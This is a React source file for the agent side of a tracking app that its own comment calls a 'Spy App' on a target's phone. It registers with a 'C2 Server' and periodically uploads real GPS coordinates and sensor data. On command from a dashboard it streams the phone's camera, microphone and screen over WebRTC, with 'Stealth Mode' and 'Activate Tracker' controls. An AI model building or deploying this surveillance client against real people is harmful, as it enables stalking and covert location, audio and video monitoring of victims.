
import { useState, useEffect, useRef, useCallback } from 'react';
import { AuthAPI } from '../services/api/auth';
import { TelemetryAPI } from '../services/api/telemetry';
import { socketService } from '../services/socket';
import { Device } from '../types';
import { Lock, Unlock, Radio, Navigation, Camera, AlertTriangle, WifiOff, MonitorDot, Mic, Video, CircleDot, BatteryCharging } from 'lucide-react';
import { clsx } from 'clsx';
import adapter from 'webrtc-adapter'; // Ensure adapter is available for WebRTC

// This component simulates the "Spy App" installed on the target phone
export default function AgentDevice() {
  const [device, setDevice] = useState<Device | null>(null);
  const [registered, setRegistered] = useState(false);
  const [activeUplink, setActiveUplink] = useState(false);
  const [logs, setLogs] = useState<string[]>([]);
  const [batteryLevel, setBatteryLevel] = useState(100);
  const [isStreaming, setIsStreaming] = useState(false); // Indicates if WebRTC stream is active
  const [isCameraActive, setIsCameraActive] = useState(false);
  const [isMicActive, setIsMicActive] = useState(false);
  const [isScreenActive, setIsScreenActive] = useState(false);
  
  const localVideoRef = useRef<HTMLVideoElement>(null);
  const trackingInterval = useRef<NodeJS.Timeout | null>(null);

  const addLog = useCallback((msg: string, level: 'INFO' | 'WARN' | 'CRITICAL' = 'INFO') => {
    setLogs(prev => [`[${new Date().toLocaleTimeString()}] [${level}] ${msg}`, ...prev].slice(0, 10));
  }, []);

  // --- Registration Logic ---
  const registerDevice = async () => {
    try {
      addLog("Handshaking with C2 Server...");
      const res = await AuthAPI.registerDevice({
        deviceName: `AGENT-${Math.floor(Math.random() * 99999)}`,
        deviceType: 'WEB_AGENT'
      });
      
      localStorage.setItem('tactical_token', res.token);
      localStorage.setItem('device_id', res.deviceId);
      
      setDevice(res.device);
      setRegistered(true);
      addLog(`Identity Confirmed: ${res.deviceId.substring(0,8)}...`);
    } catch (err: any) {
      addLog(`Registration Failed: ${err.message}. Server Offline or network error?`, 'CRITICAL');
      console.error(err);
    }
  };

  // --- Uplink / Telemetry / WebRTC Logic ---
  const startUplink = useCallback(async () => {
    if (!device) {
      addLog("Device not registered. Cannot establish uplink.", 'WARN');
      return;
    }
    const token = localStorage.getItem('tactical_token');
    if (!token) {
      addLog("No token found. Please register device.", 'CRITICAL');
      return;
    }

    // Connect to Socket.io
    socketService.connect(token);
    setActiveUplink(true);
    addLog("Active Uplink Established. Awaiting commands...");

    // Inform server about initial online status via WebSocket
    socketService.emitTelemetry('STATUS', { online: true });
    addLog("Initial ONLINE status sent via WebSocket.");

    // WebRTC Signaling Handlers (for agent to respond to dashboard's stream requests)
    socketService.socket?.on('webrtc_offer', async (senderId: string, offer: RTCSessionDescriptionInit) => {
      addLog(`Received stream request (OFFER) from C2. Initiating WebRTC...`);
      setIsStreaming(true);
      await socketService.createPeerConnection(senderId, true); // Agent is the answerer, but initiates local stream
      
      try {
        // Request camera and microphone access
        const localStream = await socketService.startLocalStream(true, true, false); // Start camera + mic
        if (localStream && localVideoRef.current) {
          localVideoRef.current.srcObject = localStream; // Show local stream for user confirmation
          setIsCameraActive(true);
          setIsMicActive(true);
          addLog("Camera & Mic stream started for WebRTC.");
        } else {
          addLog("Failed to start camera/mic stream. Permissions denied?", 'WARN');
        }

        await socketService.peerConnection!.setRemoteDescription(new RTCSessionDescription(offer));
        const answer = await socketService.peerConnection!.createAnswer();
        await socketService.peerConnection!.setLocalDescription(answer);
        socketService.socket?.emit('webrtc_answer', senderId, answer);
        addLog("WebRTC ANSWER sent to C2. Stream active.");
      } catch (e) {
        console.error('[WebRTC Agent] Error handling offer:', e);
        addLog(`WebRTC Offer Error: ${(e as Error).message}`, 'CRITICAL');
        socketService.cleanupWebRTC();
        setIsStreaming(false);
        setIsCameraActive(false);
        setIsMicActive(false);
        setIsScreenActive(false);
      }
    });

    // Start Sensors Loop
    trackingInterval.current = setInterval(() => {
        // 1. Simulate Battery Drain
        setBatteryLevel(prev => Math.max(0, prev - (Math.random() > 0.8 ? 1 : 0))); // More realistic drain
        socketService.emitTelemetry('BATTERY', { level: batteryLevel });

        // 2. Real Geolocation (User must approve)
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(
            (pos) => {
              socketService.emitTelemetry('GPS', {
                lat: pos.coords.latitude,
                lng: pos.coords.longitude,
                acc: pos.coords.accuracy
              });
            },
            (err) => addLog(`GPS Error: ${err.message}`, 'WARN')
          );
        } else {
            addLog("Geolocation not supported by this browser.", 'WARN');
        }

        // 3. Simulate Device Orientation / Accelerometer data
        if (window.DeviceOrientationEvent) {
            window.addEventListener('deviceorientation', (event) => {
                socketService.emitTelemetry('SENSOR', {
                    alpha: event.alpha, // Z-axis rotation
                    beta: event.beta,   // X-axis rotation
                    gamma: event.gamma  // Y-axis rotation
                });
            }, { once: true }); // Only send once per interval to avoid excessive events
        }
        
        // 4. Simulate other sensor data like CPU and memory for the web agent
        const cpu = Math.floor(Math.random() * 20) + 5; // 5-25%
        const mem = Math.floor(Math.random() * 30) + 15; // 15-45%
        socketService.emitTelemetry('SENSOR', { cpu, mem });

    }, 5000); // Update every 5s

  }, [device, batteryLevel, addLog]);

  const stopUplink = useCallback(async () => {
    if (trackingInterval.current) clearInterval(trackingInterval.current);
    socketService.disconnect(); // This will also cleanup WebRTC
    setActiveUplink(false);
    setIsStreaming(false);
    setIsCameraActive(false);
    setIsMicActive(false);
    setIsScreenActive(false);
    if (localVideoRef.current) localVideoRef.current.srcObject = null;
    addLog("Stealth Mode Engaged (Uplink TERMINATED)");
    // Send final offline status (may fail if socket is already closed)
    socketService.emitTelemetry('STATUS', { online: false }); // Try to send, might fail if socket already gone.
  }, [addLog]);

  const toggleUplink = activeUplink ? stopUplink : startUplink;

  // --- Camera/Mic/Screen Control (for agent to proactively manage its local streams) ---
  const toggleCamera = async () => {
    if (!activeUplink) { addLog("Uplink not active.", 'WARN'); return; }
    if (isScreenActive) { addLog("Screen sharing is active, cannot toggle camera directly. Stop screen share first.", 'WARN'); return; }

    if (isCameraActive) {
      socketService.stopLocalStream();
      setIsCameraActive(false);
      addLog("Camera feed stopped.");
    } else {
      addLog("Requesting camera access...");
      try {
        const stream = await socketService.startLocalStream(true, isMicActive, false);
        if (stream && localVideoRef.current) {
          localVideoRef.current.srcObject = stream;
          setIsCameraActive(true);
          addLog("Camera feed started.");
        } else {
          addLog("Failed to start camera feed. Permission denied or no camera?", 'WARN');
        }
      } catch (e) {
        addLog(`Camera access failed: ${(e as Error).message}`, 'CRITICAL');
      }
    }
  };

  const toggleMic = async () => {
    if (!activeUplink) { addLog("Uplink not active.", 'WARN'); return; }
    if (isScreenActive) { addLog("Screen sharing is active, cannot toggle mic directly. Stop screen share first.", 'WARN'); return; }

    if (isMicActive) {
      socketService.stopLocalStream(); // Stop existing, then restart to reconfigure tracks
      setIsMicActive(false);
      addLog("Microphone feed stopped.");
      // Restart camera if it was active
      if (isCameraActive) {
        const stream = await socketService.startLocalStream(true, false, false);
        if (stream && localVideoRef.current) localVideoRef.current.srcObject = stream;
      }
    } else {
      addLog("Requesting microphone access...");
      try {
        socketService.stopLocalStream();
        const stream = await socketService.startLocalStream(isCameraActive, true, false);
        if (stream && localVideoRef.current) {
          localVideoRef.current.srcObject = stream;
          setIsMicActive(true);
          addLog("Microphone feed started.");
        } else {
          addLog("Failed to start microphone feed. Permission denied or no microphone?", 'WARN');
        }
      } catch (e) {
        addLog(`Microphone access failed: ${(e as Error).message}`, 'CRITICAL');
      }
    }
  };

  const toggleScreenShare = async () => {
    if (!activeUplink) { addLog("Uplink not active.", 'WARN'); return; }
    
    if (isScreenActive) {
      socketService.stopLocalStream();
      setIsScreenActive(false);
      setIsCameraActive(false); // Screen share usually takes over camera
      setIsMicActive(false);
      addLog("Screen sharing stopped.");
    } else {
      addLog("Requesting screen share permission. Select browser tab.", 'INFO');
      try {
        const stream = await socketService.startLocalStream(false, true, true); // Video from screen, audio from mic
        if (stream && localVideoRef.current) {
          localVideoRef.current.srcObject = stream;
          setIsScreenActive(true);
          setIsCameraActive(false); // Make sure camera is off
          setIsMicActive(true); // Assuming mic can be active with screen share
          addLog("Screen sharing started.");
        } else {
          addLog("Failed to start screen sharing. Permission denied or cancelled.", 'WARN');
        }
      } catch (e) {
        addLog(`Screen sharing failed: ${(e as Error).message}`, 'CRITICAL');
      }
    }
  };


  // --- Initial Mount Effect ---
  useEffect(() => {
    const savedToken = localStorage.getItem('tactical_token');
    const savedId = localStorage.getItem('device_id');
    
    if (savedToken && savedId) {
      addLog(`Stored credentials found for ${savedId.substring(0,8)}.... Ready to re-link.`, 'INFO');
      setRegistered(true);
      // For a real app, verify token with AuthAPI.verifySession()
      setDevice({ id: savedId, name: `AGENT-${savedId.substring(0,4)}`, type: 'WEB_AGENT', isOnline: false, lastBattery: 0, lastLat: null, lastLng: null, lastIp: null, updatedAt: new Date().toISOString(), createdAt: new Date().toISOString() }); 
    } else {
        addLog("No existing agent identity found. Please register.", 'INFO');
    }
    
    // Ensure WebRTC adapter is initialized for cross-browser compatibility
    adapter.browserShim.shimPeerConnection(window, 'RTCPeerConnection');

    return () => {
      if (trackingInterval.current) clearInterval(trackingInterval.current);
      socketService.disconnect();
    };
  }, [addLog]);

  return (
    <div className="h-screen w-screen bg-black text-white p-6 font-mono flex flex-col items-center justify-center relative overflow-hidden">
      {/* Background Decor */}
      <div className="absolute inset-0 bg-red-900/10 pointer-events-none" />
      <div className="absolute top-0 w-full h-1 bg-gradient-to-r from-transparent via-red-600 to-transparent opacity-50" />

      <div className="z-10 w-full max-w-md space-y-8">
        
        <div className="text-center space-y-2">
          <div className="inline-block p-4 rounded-full bg-red-900/20 border border-red-500/50 mb-4 relative">
             <div className={`absolute inset-0 rounded-full border border-red-500 ${activeUplink ? 'animate-ping' : ''}`}></div>
             <Radio size={48} className="text-red-500" />
          </div>
          <h1 className="text-3xl font-bold tracking-tighter uppercase">Field Agent Link</h1>
          <p className="text-xs text-red-400">AUTHORIZED PERSONNEL ONLY. CLASSIFIED.</p>
        </div>

        <div className="bg-neutral-900 border border-neutral-800 p-6 rounded-lg space-y-6 shadow-2xl">
          
          {/* Status Indicators */}
          <div className="grid grid-cols-2 gap-4 text-xs text-center">
             <div className={`p-2 rounded border ${registered ? 'border-green-500 text-green-500 bg-green-900/20' : 'border-neutral-700 text-neutral-500'}`}>
                {registered ? 'AUTHENTICATED' : 'UNREGISTERED'}
             </div>
             <div className={`p-2 rounded border ${activeUplink ? 'border-red-500 text-red-500 bg-red-900/20 animate-pulse' : 'border-neutral-700 text-neutral-500'}`}>
                {activeUplink ? 'TRANSMITTING' : 'IDLE'}
             </div>
          </div>

          {/* Controls */}
          <div className="space-y-3">
            {!registered ? (
               <button 
                onClick={registerDevice}
                className="w-full py-4 bg-white text-black font-bold uppercase tracking-widest hover:bg-gray-200 transition-colors flex items-center justify-center gap-2"
               >
                 <Lock size={16} /> Establish Identity
               </button>
            ) : (
               <button 
                onClick={toggleUplink}
                className={`w-full py-4 font-bold uppercase tracking-widest transition-all flex items-center justify-center gap-2 border-2
                  ${activeUplink 
                    ? 'bg-red-600 border-red-600 text-white hover:bg-red-700' 
                    : 'bg-transparent border-white text-white hover:bg-white hover:text-black'
                  }`}
               >
                 {activeUplink ? <Unlock size={16}/> : <Navigation size={16}/>}
                 {activeUplink ? 'Terminate Uplink' : 'Activate Tracker'}
               </button>
            )}
          </div>

          {/* Battery Status */}
          <div className="flex items-center justify-between text-xs text-neutral-400">
             <div className="flex items-center gap-2">
                <BatteryCharging size={16} /> Battery Level: {batteryLevel}%
             </div>
             {batteryLevel < 20 && <span className="text-red-500 animate-pulse">CRITICAL LOW</span>}
          </div>

          {/* Media Stream Controls */}
          {activeUplink && (
            <div className="space-y-2 pt-4 border-t border-neutral-800">
                <p className="text-xs text-neutral-500 uppercase font-bold">Live Feed Controls</p>
                <div className="flex justify-around">
                  <button 
                    onClick={toggleCamera} 
                    className={clsx("p-2 rounded-full", isCameraActive ? "bg-red-600 text-white" : "bg-neutral-700 text-neutral-300")}
                    title="Toggle Camera"
                    disabled={isScreenActive}
                  >
                    <Video size={18} />
                  </button>
                  <button 
                    onClick={toggleMic} 
                    className={clsx("p-2 rounded-full", isMicActive ? "bg-red-600 text-white" : "bg-neutral-700 text-neutral-300")}
                    title="Toggle Microphone"
                    disabled={isScreenActive}
                  >
                    <Mic size={18} />
                  </button>
                  <button 
                    onClick={toggleScreenShare} 
                    className={clsx("p-2 rounded-full", isScreenActive ? "bg-red-600 text-white" : "bg-neutral-700 text-neutral-300")}
                    title="Toggle Screen Sharing (Browser Tab)"
                  >
                    <MonitorDot size={18} />
                  </button>
                </div>
                {/* Local video preview */}
                <video ref={localVideoRef} autoPlay playsInline muted className="w-full h-32 bg-black mt-2 object-cover border border-neutral-700"></video>
                {(isCameraActive || isMicActive || isScreenActive) && (
                    <div className="text-center text-xs text-green-500 flex items-center justify-center gap-1">
                        <CircleDot size={12} className="animate-pulse text-red-500" /> LIVE FEED ACTIVE
                    </div>
                )}
            </div>
          )}

          {/* Sensor Permissions */}
          <div className="text-xs space-y-2 text-neutral-500 pt-4 border-t border-neutral-800">
             <div className="flex items-center gap-2">
                <Camera size={12} /> Camera Access: {isCameraActive || isScreenActive ? 'GRANTED' : 'PENDING'}
             </div>
             <div className="flex items-center gap-2">
                <Navigation size={12} /> GPS Access: {activeUplink ? 'GRANTED' : 'PENDING'}
             </div>
          </div>

        </div>

        {/* Terminal Output */}
        <div className="bg-black border border-neutral-800 p-4 rounded h-32 font-mono text-xs text-green-500 overflow-hidden flex flex-col-reverse">
           {logs.map((l, i) => <div key={i} className={clsx(l.includes('[CRITICAL]') && 'text-red-500', l.includes('[WARN]') && 'text-yellow-500')}>{l}</div>)}
           {logs.length === 0 && <span className="text-neutral-700 animate-pulse">Waiting for command...</span>}
        </div>
        
        <div className="flex items-center justify-center gap-2 text-[10px] text-neutral-600">
            <AlertTriangle size={10} />
            <span>BY USING THIS SOFTWARE YOU CONSENT TO TACTICAL SURVEILLANCE</span>
        </div>

      </div>
    </div>
  );
}
